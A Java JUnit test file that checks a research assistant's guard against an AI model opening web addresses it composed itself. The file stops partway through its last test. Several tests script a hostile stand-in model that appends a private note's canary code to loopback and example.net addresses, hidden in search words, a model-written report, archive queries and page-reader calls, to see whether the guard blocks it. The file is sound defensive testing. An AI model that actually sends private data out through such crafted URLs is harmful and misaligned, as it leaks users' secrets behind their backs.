package org.researchzosho.librarian;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.sun.net.httpserver.HttpServer;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.researchzosho.Config;
import org.researchzosho.drive.ContentJudge;
import org.researchzosho.mcp.McpClient;
import org.researchzosho.mcp.StandInHttp;
import org.researchzosho.tools.Outbound;
import org.researchzosho.tools.SearchTally;
import org.researchzosho.tools.WebSearchTool;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.BiFunction;
import java.util.function.UnaryOperator;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Regression checks of the address guard before 0.8.1 goes out: each test states what the guard is expected to do in one situation a
 * reader of the code doubted, and sees whether the code does it. The stand-ins are the ones {@link HostileToolsTest} uses: a collector
 * on the loopback that keeps every request whole, a second listener that stands in for the services the tools are written for, and a
 * bare socket that counts connections. No test asks a host outside this machine. Every test that expects nothing to arrive first sees
 * something that should arrive do so, on the same listener, so that a zero is a refusal and not a listener that cannot count.
 *
 * <p>Each test prints one line that begins {@code [check]} with what it counted, before it asserts, so that the numbers are in the
 * run's output whether the assertion holds or not.
 */
class GuardChecksTest {
    static final ObjectMapper M = new ObjectMapper();
    /** What must never arrive: a line of the person's private note. */
    static final String CANARY = "QX7731MOOR";

    @TempDir Path tmp;
    String realHome;
    HttpServer collector, service; ServerSocket bare; Thread accepting;
    String out, own; int barePort;
    /** Every request the collector had: its method, its address exactly as it was asked, and its body. */
    final List<String> arrived = new CopyOnWriteArrayList<>();
    /** Every address asked of the stand-in for the tools' own services, exactly as it was asked. */
    final List<String> asked = new CopyOnWriteArrayList<>();
    final AtomicInteger connections = new AtomicInteger();
    /** What the stand-in for a tool's own service answers a path with: status, body, content type; 404 for any other. */
    final Map<String, String[]> serves = new HashMap<>();
    final Map<String, Object> archives = new HashMap<>();
    LibraryStore store;

    @BeforeEach void up() throws Exception {
        realHome = System.getProperty("user.home");
        System.setProperty("user.home", tmp.resolve("home").toString()); Config.invalidate();
        collector = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        collector.createContext("/", x -> {
            String body = new String(x.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
            arrived.add(x.getRequestMethod() + " " + x.getRequestURI() + "\n" + body);
            byte[] b = "<html><head><title>A page</title></head><body><p>The ferry ran from 1911 to 1968.</p></body></html>".getBytes(StandardCharsets.UTF_8);
            x.getResponseHeaders().add("Content-Type", "text/html; charset=utf-8");
            x.sendResponseHeaders(200, b.length); x.getResponseBody().write(b); x.close();
        });
        collector.start();
        out = "http://127.0.0.1:" + collector.getAddress().getPort();
        service = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        service.createContext("/", x -> {
            String path = x.getRequestURI().toString();
            asked.add(path);
            String[] answer = null;
            for (Map.Entry<String, String[]> e : serves.entrySet()) if (path.startsWith(e.getKey())) answer = e.getValue();
            byte[] b = (answer == null ? "not found" : answer[1]).getBytes(StandardCharsets.UTF_8);
            x.getResponseHeaders().add("Content-Type", answer == null ? "text/plain" : answer[2]);
            x.sendResponseHeaders(answer == null ? 404 : Integer.parseInt(answer[0]), b.length); x.getResponseBody().write(b); x.close();
        });
        service.start();
        own = "http://127.0.0.1:" + service.getAddress().getPort();
        Outbound.standIn("127.0.0.1:" + service.getAddress().getPort());   // the stand-in for the hosts the tools are written for
        bare = new ServerSocket(0, 50, InetAddress.getLoopbackAddress());
        barePort = bare.getLocalPort();
        accepting = new Thread(() -> { while (!bare.isClosed()) { try (Socket s = bare.accept()) { connections.incrementAndGet(); } catch (Exception closed) { return; } } }, "collector-bare");
        accepting.setDaemon(true); accepting.start();
        GivenAddressesTest.loopback(true);
        ContentJudge.use(new ContentJudge(null, m -> "no"));
        for (String f : List.of("WAYBACK", "ARCHIVE_TODAY", "COMMON_CRAWL", "IA", "IA_FTS", "WIKIPEDIA")) archives.put(f, HostileToolsTest.archive(f, f.equals("WIKIPEDIA") ? own + "/wikipedia-%s" : own + "/" + f.toLowerCase()));
        store = new LibraryStore(tmp.resolve("home").resolve("researchzosho-library")); store.init();
        new LibrarianIndex(store, Embeddings.none()).rebuild();
        Path dir = tmp.resolve("notes"); Files.createDirectories(dir);
        Files.writeString(dir.resolve("kestrel-private-notes.md"), "# My notes on Kestrel Sound (private)\n\nThe archive room's door code is " + CANARY + ". Do not share it.\n");
        Corpus.addFolder(store, dir, "notes", false);
        GivenWords.forget();
    }

    @AfterEach void down() throws Exception {
        for (Map.Entry<String, Object> e : archives.entrySet()) HostileToolsTest.archive(e.getKey(), e.getValue());
        ContentJudge.use(null); GivenAddressesTest.loopback(false);
        collector.stop(0); service.stop(0); bare.close();
        Outbound.noStandIns();
        GivenWords.forget();
        System.setProperty("user.home", realHome); Config.invalidate();
    }

    /** The first lines of the requests among {@code requests} that hold {@code what}, as written or percent-encoded. */
    static List<String> with(List<String> requests, String what) {
        List<String> found = new ArrayList<>();
        for (String r : requests) { String plain; try { plain = URLDecoder.decode(r, StandardCharsets.UTF_8); } catch (IllegalArgumentException e) { plain = r; } if (r.contains(what) || plain.contains(what)) found.add(r.lines().findFirst().orElse(r)); }
        return found;
    }

    static String q(String s) { return M.valueToTree(s).toString(); }
    static ObjectNode tool(String name, String argsJson) { try { return LibrarianChatTest.tool(name, argsJson); } catch (Exception e) { throw new IllegalStateException(e); } }

    /**
     * One turn of the chat, by a Librarian made for the turn as the web chat makes one. The model answers round after round with the
     * calls of {@code rounds}, each call under the id {@code id} gives it (the round, the call's place in its message), and then says
     * it is done. What the library told it for each call of this turn, in order.
     */
    List<String> turn(Librarian.Session s, String person, List<List<ObjectNode>> rounds, BiFunction<Integer, Integer, String> id) throws Exception {
        int before = 0;
        for (ObjectNode m : s.messages()) if ("tool".equals(m.path("role").asText())) before++;
        Researcher.Drive model = new Researcher.Drive() {
            int round;
            @Override public ObjectNode chat(ArrayNode messages, ArrayNode offered, int maxTokens, String toolChoice) {
                ObjectNode m = M.createObjectNode(); m.put("role", "assistant");
                if (round >= rounds.size() || "none".equals(toolChoice)) return m.put("content", "Done.");
                List<ObjectNode> calls = rounds.get(round);
                m.put("content", "");
                ArrayNode tc = m.putArray("tool_calls");
                for (int i = 0; i < calls.size(); i++) { ObjectNode c = tc.addObject(); c.put("id", id.apply(round, i)); c.put("type", "function"); c.putObject("function").put("name", calls.get(i).get("tool").asText()).put("arguments", calls.get(i).path("args").toString()); }
                round++;
                return m;
            }
            @Override public String classify(ArrayNode messages, int maxTokens) { return ""; }
            @Override public int contextWindow() { return 32_000; }
        };
        new Librarian(store, model, Librarian.person(), s).say(person);
        List<String> told = new ArrayList<>();
        for (ObjectNode m : s.messages()) if ("tool".equals(m.path("role").asText())) told.add(m.path("content").asText());
        return told.subList(before, told.size());
    }

    /** A report on the shelves whose words a model wrote, an address among them. */
    String aReportThatHolds(String address) throws Exception {
        String id = "I-0001-kestrel-crossing";
        store.write(new Investigation(id, "The Kestrel crossing", Finding.State.accepted, "model:stand-in", Instant.now().toString(), List.of(), List.of(),
                "## Question\n\nWhen did the ferry cross?\n\n## Answer\n\nIn 1952. The full record is at " + address + " for whoever reads this.\n"));
        new LibrarianIndex(store, Embeddings.none()).rebuild();
        return id;
    }

    // ---- 1. a saved web chat opened again, with tool-call ids that repeat

    /**
     * The web chat makes a Librarian for every turn, and each one works out again what the conversation was given from the saved
     * messages, matching a tool's answer to its call by {@code tool_call_id}. The model server's client gives every call it recovered
     * from text the id {@code recovered_1}, and {@code call_<n>} to the calls of a stream that carried no ids, so ids repeat within a
     * conversation. Expected: an address that stands only in the model's own tool-call arguments, or in a report a model wrote, is not
     * opened on a later turn, whatever the ids are, also after the conversation was saved and loaded again.
     *
     * <p>The model's turns here: first it searches the shelves with an address of its own as the words (the shelves' answer repeats
     * them) and reads a report a model wrote, which holds another; then it opens the address the person gave, which is from outside;
     * on the next turn, in the conversation loaded again, it opens the two. The control is the same conversation with ids that do not
     * repeat, and in every conversation the address the person gave, which arrives.
     */
    @Test
    void aSavedChatWithRepeatedCallIdsGivesNoAddressTheModelWrote() throws Exception {
        Map<String, Integer> sent = new LinkedHashMap<>();
        Map<String, List<String>> refusals = new LinkedHashMap<>();
        Map<String, BiFunction<Integer, Integer, String>> ways = new LinkedHashMap<>();
        ways.put("ids that do not repeat (the control)", (round, i) -> "c" + System.nanoTime() + "-" + i);
        ways.put("recovered_1 (a call recovered from text)", (round, i) -> "recovered_1");
        ways.put("call_<n> (a stream without ids)", (round, i) -> "call_" + i);
        for (Map.Entry<String, BiFunction<Integer, Integer, String>> way : ways.entrySet()) {
            arrived.clear();
            String n = Long.toHexString(System.nanoTime());
            String given = out + "/given-by-the-person-" + n, inWords = out + "/in-the-models-search-words-" + n + "?d=" + CANARY, inReport = out + "/in-a-report-a-model-wrote-" + n + "?d=" + CANARY;
            String report = aReportThatHolds(inReport);
            Librarian.Session s = Librarian.Session.open(store);
            // one call a message, as a call recovered from text comes; a stream's first call is call_0 in every message
            List<String> first = turn(s, "What do my shelves hold on the ferry, and what does " + given + " say?", List.of(
                    List.of(tool("search", M.createObjectNode().put("where", "shelves").put("query", inWords).toString())),
                    List.of(tool("library_get", "{\"id\":" + q(report) + "}")),
                    List.of(tool("open", "{\"address\":" + q(given) + "}"))), way.getValue());
            assertTrue(first.size() == 3 && first.get(0).contains(inWords) && first.get(1).contains(inReport), way.getKey() + ": the shelves' answer repeats the model's words, and the report is read with the address in it: " + first);
            assertEquals(1, with(arrived, "/given-by-the-person-" + n).size(), way.getKey() + ": the address the person gave is opened, and the collector sees it (the control): " + arrived + " / " + first);
            assertEquals(List.of(), with(arrived, CANARY), way.getKey() + ": nothing of the model's own was opened in the first turn");
            // the conversation as it is on disk, opened again, and the next turn made by a Librarian of its own
            Librarian.Session again = Librarian.Session.resume(store, s.id);
            HostileModelTest.forget(GivenAddresses.key(inWords)); HostileModelTest.forget(GivenAddresses.key(inReport));   // as a later process has it: nothing remembered but the file
            List<String> second = turn(again, "Go on.", List.of(List.of(tool("open", "{\"address\":" + q(inWords) + "}")), List.of(tool("open", "{\"address\":" + q(inReport) + "}"))), way.getValue());
            sent.put(way.getKey(), with(arrived, CANARY).size());
            refusals.put(way.getKey(), second.stream().map(t -> t.startsWith("NOT OPENED: ") ? "not opened" : "opened").toList());
        }
        System.out.println("[check] 1 a saved chat opened again, requests with the canary at the collector on the later turn, by the ids of the calls: " + sent + "; the model was told: " + refusals);
        assertEquals(0, sent.get("ids that do not repeat (the control)"), "with ids that do not repeat, nothing the model wrote is opened: " + refusals);
        assertEquals(0, sent.get("recovered_1 (a call recovered from text)"), "with the id a recovered call is given, an address the model wrote was opened on the later turn: " + refusals);
        assertEquals(0, sent.get("call_<n> (a stream without ids)"), "with the ids a stream without ids is given, an address the model wrote was opened on the later turn: " + refusals);
    }

    // ---- 2. an address is asked exactly as it was given

    /** A run's web tools: the fetch, the archive search and the podcast search, as a run has them ({@link HostileToolsTest#tools}). */
    List<String> run(String question, List<ObjectNode> calls) throws Exception {
        List<String> told = new CopyOnWriteArrayList<>();
        ResearcherTest.ScriptedDrive model = new ResearcherTest.ScriptedDrive() {
            { criticWantsMore = false; }
            @Override public ObjectNode chat(ArrayNode history, ArrayNode offered, int maxTokens, String toolChoice) {
                List<String> n = names(offered);
                if (n.equals(List.of("done"))) return call("done", M.createObjectNode().put("summary", "closed"));
                int turn = assistantTurns(history) + 1;
                if (n.contains("write_section")) return turn == 1 ? call("write_section", M.createObjectNode().put("heading", "Answer").put("text", "Nothing was found.")) : call("done", M.createObjectNode().put("summary", "written"));
                List<String> answers = new ArrayList<>();
                for (JsonNode m : history) if ("tool".equals(m.path("role").asText())) answers.add(m.path("content").asText());
                if (answers.size() > told.size()) { told.clear(); told.addAll(answers); }
                return turn <= calls.size() ? calls.get(turn - 1) : call("done", M.createObjectNode().put("summary", "done"));
            }
        };
        new Researcher(model, model, HostileToolsTest.tools(), s -> { }, 1, store).run(new Researcher.Ask(question, "depth", 30, List.of("what can be found?"), "both", List.of()), "");
        return told;
    }

    static ObjectNode call(String name, String argsJson) { return HostileToolsTest.call(name, argsJson); }

    /** One turn of the chat with a model that makes these calls, one a message, under ids of their own. */
    List<String> chat(Librarian.Session s, String person, ObjectNode... calls) throws Exception {
        List<List<ObjectNode>> rounds = new ArrayList<>();
        for (ObjectNode c : calls) rounds.add(List.of(c));
        return turn(s, person, rounds, (round, i) -> "c" + System.nanoTime() + "-" + i);
    }

    /** The addresses asked of {@code requests} that hold {@code mark}, each exactly as it was asked (the method left off). */
    static List<String> targets(List<String> requests, String mark) {
        List<String> out = new ArrayList<>();
        for (String r : requests) { String first = r.lines().findFirst().orElse(r); if (first.contains(mark)) out.add(first.replaceFirst("^[A-Z]+ ", "")); }
        return out;
    }

    /**
     * The rule itself, with no network: an address that was given is put back into a call's arguments as it was given, whichever
     * spelling of it the model wrote and wherever in the arguments it stands. The comparison reads the two spellings as one address
     * (the first assertion, the control); what a tool is handed, and so what it requests, has to be the given one. Expected: every
     * place a tool reads an address from. A search's words are left as the model wrote them, by the rule's own word, and are not here.
     */
    @Test
    void anAddressIsPutBackAsItWasGivenWhereverItStandsInACall() throws Exception {
        String n = Long.toHexString(System.nanoTime());
        String host = "harbour-gazette-" + n + ".example.org", given = "https://" + host + "/Harbour/Gazette-1968?id=7&page=2";
        String another = "https://" + host + "/Harbour/Almanac-1969";
        GivenAddresses.received("1. The Harbour Gazette, 1968 — " + given + "\n2. The Harbour Almanac, 1969 — " + another);
        // the model's spellings of it, each with the piece of it that tells it from the given one
        Map<String, String[]> spellings = new LinkedHashMap<>();
        spellings.put("a letter written as an escape", new String[]{given.replace("/Gazette", "/%47azette"), "%47azette"});
        spellings.put("the question mark written as an escape", new String[]{given.replace("?id", "%3Fid"), "%3Fid"});
        spellings.put("a full stop after it", new String[]{given + ".", "page=2."});
        spellings.put("http for https", new String[]{given.replace("https://", "http://"), "http://"});
        spellings.put("capitals in the scheme and the host", new String[]{given.replace("https://harbour", "HTTPS://Harbour"), "HTTPS://Harbour"});
        for (Map.Entry<String, String[]> e : spellings.entrySet()) assertTrue(GivenAddresses.given(e.getValue()[0]), "the comparison reads it as the given address (the control), " + e.getKey() + ": " + e.getValue()[0]);
        // where an address stands in a call: %s is the address
        Map<String, String> places = new LinkedHashMap<>();
        places.put("url", "{\"url\":%s}");
        places.put("address", "{\"address\":%s}");
        places.put("an argument of another name (feed)", "{\"kind\":\"episodes\",\"feed\":%s}");
        places.put("a list of addresses (images)", "{\"op\":\"judge\",\"images\":[%s]}");
        places.put("an object in an object", "{\"options\":{\"page\":%s}}");
        places.put("a list of objects (the found[] objects of a picture search)", "{\"op\":\"judge\",\"images\":[{\"image\":%s,\"title\":\"The gazette\"}]}");
        places.put("a list in a list", "{\"batches\":[[%s]]}");
        places.put("lines of addresses in one value (bookmarks pasted)", "{\"text\":%s}");
        List<String> notPutBack = new ArrayList<>();
        int putBack = 0;
        for (Map.Entry<String, String> place : places.entrySet()) for (Map.Entry<String, String[]> sp : spellings.entrySet()) {
            String written = sp.getValue()[0], value = place.getKey().startsWith("lines") ? written + "\n" + another : written;
            JsonNode args = M.readTree(String.format(place.getValue(), q(value)));
            assertEquals(null, GivenAddresses.notGiven(args, true), "the call is let through, the address being a given one: " + args);
            String as = GivenAddresses.asGiven(args).toString();
            if (as.contains(sp.getValue()[1]) || !as.contains(given)) notPutBack.add(place.getKey() + " / " + sp.getKey()); else putBack++;
        }
        // and one written without its scheme where a tool adds the scheme itself though the argument is not url or address
        String bare = host + "/Harbour/%47azette-1968?id=7&page=2";
        JsonNode feed = M.readTree("{\"kind\":\"episodes\",\"feed\":" + q(bare) + "}");
        if (GivenAddresses.asGiven(feed).toString().contains("%47azette")) notPutBack.add("an argument of another name (feed), written without its scheme / a letter written as an escape"); else putBack++;
        System.out.println("[check] 2 put back as given, by where the address stands and how the model wrote it: " + putBack + " of " + (putBack + notPutBack.size()) + "; left as the model wrote it: " + notPutBack);
        assertEquals(List.of(), notPutBack, "an address a call holds is handed to its tool as the model wrote it, not as it was given");
    }

    /**
     * The same on the wire: the collector keeps each request's address exactly as it was asked. The person gives an address; the
     * model writes it another way in a call; what arrives has to be the given spelling. Each tool here first asks for it written as it
     * was given in an argument the rule puts back (the control: the listener sees the exact spelling).
     */
    @Test
    void whatIsRequestedIsTheGivenSpellingInEveryTool() throws Exception {
        BiFunction<String, String, Researcher.Drive> eyes = Vision.DRIVES;
        ImagesTest.seeingDefault();
        Vision.DRIVES = (d, m) -> new Researcher.Drive() {   // a model that sees, and says no to whatever it is shown
            @Override public ObjectNode chat(ArrayNode messages, ArrayNode offered, int maxTokens, String toolChoice) { return M.createObjectNode().put("role", "assistant").put("content", "No."); }
            @Override public String classify(ArrayNode messages, int maxTokens) { return "No, a blank page."; }
            @Override public int contextWindow() { return 16_384; }
        };
        Map<String, String> asked = new LinkedHashMap<>();   // the case → what arrived for it, or "nothing"
        Map<String, String> wanted = new LinkedHashMap<>();
        Map<String, Integer> plain = new LinkedHashMap<>();   // the case → requests that arrived by plain http for an address given with https
        try {
            String n = Long.toHexString(System.nanoTime());
            // 1. a run's fetch (url): put back
            String g1 = "/Harbour/Gazette-" + n + "-a?id=7&page=2";
            run("What does " + out + g1 + " say?", List.of(call("web_fetch", "{\"url\":" + q(out + g1.replace("/Gazette", "/%47azette")) + "}")));
            wanted.put("a run's web_fetch, url", g1); asked.put("a run's web_fetch, url", String.join(" | ", targets(arrived, n + "-a")));
            // 2. the chat's open (address)
            String g2 = "/Harbour/Gazette-" + n + "-b?id=7&page=2";
            chat(Librarian.Session.open(store), "What does " + out + g2 + " say?", tool("open", "{\"address\":" + q(out + g2.replace("?id", "%3Fid")) + "}"));
            wanted.put("the chat's open, address", g2); asked.put("the chat's open, address", String.join(" | ", targets(arrived, n + "-b")));
            // 3. a run's podcast search (feed): an argument of another name
            String g3 = "/Harbour/Hour-" + n + "-c/feed.xml?id=7";
            run("What did the Harbour Hour say? Its feed is " + out + g3, List.of(call("podcast_search", "{\"kind\":\"episodes\",\"feed\":" + q(out + g3.replace("/Hour", "/%48our")) + "}")));
            wanted.put("a run's podcast_search, feed", g3); asked.put("a run's podcast_search, feed", String.join(" | ", targets(arrived, n + "-c")));
            // 4. the chat's picture tool: a list of addresses, then a list of objects as a picture search returns them
            String g4 = "/pictures/Ferry-" + n + "-d.png?id=7", g5 = "/pictures/Ferry-" + n + "-e.png?id=7";
            chat(Librarian.Session.open(store), "Do the pictures at " + out + g4 + " and " + out + g5 + " show a ferry?",
                    tool("library_images", "{\"op\":\"judge\",\"criteria\":\"a ferry\",\"images\":[" + q(out + g4.replace("/Ferry", "/%46erry")) + "]}"),
                    tool("library_images", "{\"op\":\"judge\",\"criteria\":\"a ferry\",\"images\":[{\"image\":" + q(out + g5.replace("/Ferry", "/%46erry")) + ",\"title\":\"The ferry\"}]}"));
            wanted.put("the chat's library_images, a list of addresses", g4); asked.put("the chat's library_images, a list of addresses", String.join(" | ", targets(arrived, n + "-d")));
            wanted.put("the chat's library_images, a list of objects", g5); asked.put("the chat's library_images, a list of objects", String.join(" | ", targets(arrived, n + "-e")));
            // 5. bookmarks pasted as lines, read after the person's yes
            String g6 = "/bookmarked/Gazette-" + n + "-f?id=7&page=2";
            Librarian.Session s = Librarian.Session.open(store);
            chat(s, "Read my bookmarks: " + out + g6, tool("library_bookmarks", "{\"text\":" + q(out + g6.replace("/Gazette", "/%47azette") + "\n") + "}"));
            chat(s, "yes");
            wanted.put("the chat's library_bookmarks, lines pasted", g6); asked.put("the chat's library_bookmarks, lines pasted", String.join(" | ", targets(arrived, n + "-f")));
            // 6. given with https, written by the model with http: put back where the rule looks (the chat's open), so the plain listener is
            // never asked; in a list of objects the plain request is what leaves
            String g7 = "/secure/Gazette-" + n + "-g", g8 = "/secure/Gazette-" + n + "-h";
            String secure = out.replace("http://", "https://");
            chat(Librarian.Session.open(store), "What do " + secure + g7 + " and the picture at " + secure + g8 + " show?",
                    tool("open", "{\"address\":" + q(out + g7) + "}"),
                    tool("library_images", "{\"op\":\"judge\",\"criteria\":\"a ferry\",\"images\":[{\"image\":" + q(out + g8) + "}]}"));
            plain.put("the chat's open, address", targets(arrived, n + "-g").size());
            plain.put("the chat's library_images, a list of objects", targets(arrived, n + "-h").size());
        } finally { Vision.DRIVES = eyes; }
        List<String> otherwise = new ArrayList<>();
        int nothing = 0;
        for (Map.Entry<String, String> w : wanted.entrySet()) {
            String got = asked.get(w.getKey());
            if (got.isEmpty()) nothing++;
            else for (String one : got.split(" \\| ")) if (!one.equals(w.getValue())) otherwise.add(w.getKey() + ": asked " + one + ", given " + w.getValue());
        }
        System.out.println("[check] 2 on the wire, what each tool asked the collector for: " + asked + "; asked another way than given: " + otherwise.size() + " " + otherwise + "; nothing arrived for " + nothing + " of " + wanted.size()
                + "; an address given with https and written with http, requests that arrived by plain http: " + plain);
        assertEquals(0, nothing, "every one of the tools asked for its address, and the collector saw it (the control): " + asked);
        assertTrue(targets(arrived, "%47azette").isEmpty() && asked.get("a run's web_fetch, url").startsWith(wanted.get("a run's web_fetch, url")), "a fetch's url goes out as it was given (the control: the collector sees the exact spelling): " + asked);
        assertEquals(List.of(), otherwise, "a tool asked for a given address in the model's spelling of it");
        assertEquals(0, plain.get("the chat's open, address"), "the rule puts https back where it looks, and the plain listener is asked nothing");
        assertEquals(0, plain.get("the chat's library_images, a list of objects"), "an address given with https was asked for by plain http");
    }

    // ---- 3. the archive search's copy and history kinds

    /**
     * The archive search takes a page's address in {@code query} for its kinds copy and history, and asks the web archives for that
     * page: the address goes to the archive as part of the request. Expected: such an address is held to the rule an address in
     * {@code url} is held to, so the archive is asked only for a page that was given, and one a model put together is asked for
     * nowhere. The archives stand on the test's own listener under a name the call's words do not hold, as the real ones are named.
     * The control: the same two kinds for the page the person gave, which the stand-in is asked for.
     */
    @Test
    void theArchivesAreAskedOnlyForAPageThatWasGiven() throws Exception {
        String archive = "http://localhost:" + service.getAddress().getPort();
        Outbound.standIn("localhost:" + service.getAddress().getPort());
        for (String f : List.of("WAYBACK", "ARCHIVE_TODAY")) HostileToolsTest.archive(f, archive + "/" + f.toLowerCase());
        String n = Long.toHexString(System.nanoTime());
        String page = out + "/the-harbour-gazette-" + n;
        serves.put("/wayback/web/99999999id_/" + page, new String[]{"200", "<html><body><p>The ferry ran from 1911 to 1968 (a saved copy).</p></body></html>", "text/html"});
        serves.put("/wayback/cdx/search/cdx", new String[]{"200", "[[\"timestamp\",\"statuscode\",\"digest\",\"length\"],[\"20150601120000\",\"200\",\"ABC\",\"1234\"]]", "application/json"});
        String copyOf = out + "/copy-" + n + "?d=" + CANARY, historyOf = out + "/history-" + n + "?d=" + CANARY, bare = "127.0.0.1:" + barePort + "/bare-" + n + "?d=" + CANARY;
        List<String> told = run("Is there a saved copy of " + page + " , and how did it change?", List.of(
                call("archive_search", "{\"kind\":\"copy\",\"query\":" + q(page) + "}"),
                call("archive_search", "{\"kind\":\"history\",\"query\":" + q(page) + "}"),
                call("archive_search", "{\"kind\":\"copy\",\"query\":" + q(copyOf) + "}"),
                call("archive_search", "{\"kind\":\"history\",\"query\":" + q(historyOf) + "}"),
                call("archive_search", "{\"kind\":\"copy\",\"query\":" + q(bare) + "}")));
        List<String> forTheGiven = with(asked, "the-harbour-gazette-" + n);
        List<String> atTheArchive = with(asked, CANARY), elsewhere = with(arrived, CANARY);
        long refused = told.stream().skip(2).filter(t -> t.startsWith("NOT OPENED: ")).count();
        System.out.println("[check] 3 archive_search, copy and history, with an address nobody gave in query: " + atTheArchive.size() + " request(s) holding it at the archive's stand-in " + atTheArchive + ", " + elsewhere.size()
                + " at the collector, " + connections.get() + " connection(s) to the bare collector; refused before the tool ran: " + refused + " of 3; for the page the person gave the archive was asked " + forTheGiven.size() + " time(s)");
        assertTrue(forTheGiven.stream().anyMatch(a -> a.startsWith("/wayback/web/")) && forTheGiven.stream().anyMatch(a -> a.startsWith("/wayback/cdx/")), "the archive is asked for the page the person gave, a copy and its history, and the stand-in sees it (the control): " + asked + " / " + told);
        assertEquals(List.of(), elsewhere, "the address nobody gave was asked for itself");
        assertEquals(0, connections.get(), "the host of the address nobody gave was connected to");
        assertEquals(List.of(), atTheArchive, "the archive was asked for an address nobody gave: " + told.subList(Math.min(2, told.size()), told.size()));
    }

    // ---- 5. addresses without a scheme in other arguments, sent to a search service's reader of pages

    /** A tool of a search service's MCP server, as the service lists it. */
    static McpClient.Tool mcpTool(String name, String words, String schema) throws Exception { return new McpClient.Tool(name, "", words, (ObjectNode) M.readTree(schema), null); }

    /**
     * The search services the library knows by name (Exa, Tavily) have tools that read a page by its address: the library hands the
     * model's arguments to the service, and the service asks the page. Nothing leaves this program for the page itself, so the check
     * of the arguments is all that holds such a call. Expected: an address nobody gave is not handed over, with its scheme or without
     * (a reader of pages puts https:// before a bare one), in {@code url} or in the argument these tools take addresses in, which is a
     * list named {@code urls}. The service is a stand-in on the loopback that keeps every call it is sent. The controls: the page the
     * person gave is handed over and the stand-in sees it; an address nobody gave written with its scheme, or in {@code url}, is refused.
     */
    @Test
    void aSearchServicesReaderOfPagesIsHandedNoAddressNobodyGave() throws Exception {
        SearchTally.override = tmp.resolve("tally.json");
        try (StandInHttp exa = new StandInHttp(null, null, null); StandInHttp tavily = new StandInHttp(null, null, null)) {
            McpConnections.ADDRESS = u -> u.startsWith("https://mcp.exa.ai/") ? exa.url() : u.startsWith("https://mcp.tavily.com/") ? tavily.url() : u;
            String urls = "{\"type\":\"object\",\"properties\":{\"urls\":{\"type\":\"array\",\"items\":{\"type\":\"string\"}}},\"required\":[\"urls\"]}", url = "{\"type\":\"object\",\"properties\":{\"url\":{\"type\":\"string\"}},\"required\":[\"url\"]}";
            McpServers.Server e = new McpServers.Server();
            e.name = "exa"; e.transport = "http"; e.url = "https://mcp.exa.ai/mcp"; e.preset = "exa"; e.links = true;
            e.tools = new ArrayList<>(List.of(mcpTool("web_fetch_exa", "Read the full content of web pages by their addresses.", urls)));
            McpServers.put(store, e);
            McpServers.Server t = new McpServers.Server();
            t.name = "tavily"; t.transport = "http"; t.url = "https://mcp.tavily.com/mcp/"; t.preset = "tavily"; t.links = true;
            t.tools = new ArrayList<>(List.of(mcpTool("tavily_extract", "Extract the content of web pages by their addresses.", urls), mcpTool("tavily_crawl", "Crawl a site from a page, reading the pages it links to.", url)));
            McpServers.put(store, t);
            String n = Long.toHexString(System.nanoTime());
            String given = "https://harbour-gazette-" + n + ".example.org/1968/ferry", nobodys = "collector-" + n + ".example.net/";
            Librarian.Session s = Librarian.Session.open(store);
            List<String> told = chat(s, "Read " + given + " for me: fetch the page with exa, or extract it or crawl it with tavily.",
                    tool("exa.web_fetch_exa", "{\"urls\":[" + q(given) + "]}"),
                    tool("exa.web_fetch_exa", "{\"urls\":[" + q("https://" + nobodys + "with-its-scheme?d=" + CANARY) + "]}"),
                    tool("tavily.tavily_crawl", "{\"url\":" + q(nobodys + "bare-in-url?d=" + CANARY) + "}"),
                    tool("exa.web_fetch_exa", "{\"urls\":[" + q(nobodys + "bare-in-urls?d=" + CANARY) + "]}"),
                    tool("tavily.tavily_extract", "{\"urls\":[" + q(given) + "," + q(nobodys + "bare-beside-a-given-one?d=" + CANARY) + "]}"));
            List<String> calls = new ArrayList<>();
            for (StandInHttp server : List.of(exa, tavily)) for (StandInHttp.Seen seen : server.of("tools/call")) calls.add(M.readTree(seen.body()).path("params").toString());
            List<String> handedOver = calls.stream().filter(c -> c.contains(CANARY)).toList();
            List<String> said = told.stream().map(x -> x.startsWith("NOT OPENED: ") ? "not opened" : x.startsWith("ERROR: no tool named") ? "no such tool" : "handed to the service").toList();
            // the same rule as a research run applies it to its own calls
            boolean runLetsItThrough = GivenAddresses.unopened("exa.web_fetch_exa", M.readTree("{\"urls\":[" + q(nobodys + "bare-in-a-run?d=" + CANARY) + "]}")) == null;
            System.out.println("[check] 5 a search service's reader of pages (stand-ins for the Exa and Tavily MCP servers): " + calls.size() + " call(s) reached the services, " + handedOver.size() + " of them with an address nobody gave " + handedOver
                    + "; the five calls, in order: " + said + "; a run's own check lets a bare address in urls through: " + runLetsItThrough);
            assertEquals(5, told.size(), "the five calls were answered: " + told);
            assertTrue(calls.stream().anyMatch(c -> c.contains(given)) && said.get(0).equals("handed to the service"), "the page the person gave is handed to the service, and the stand-in sees the call (the control): " + calls + " / " + told);
            assertEquals("not opened", said.get(1), "an address nobody gave, written with its scheme, is refused (the control for the rule): " + told.get(1));
            assertEquals("not opened", said.get(2), "an address nobody gave, written without its scheme in url, is refused (the control for the rule): " + told.get(2));
            assertEquals(List.of(), handedOver, "a service that reads pages was handed an address nobody gave");
            assertFalse(runLetsItThrough, "a run's check of its own calls lets the same through");
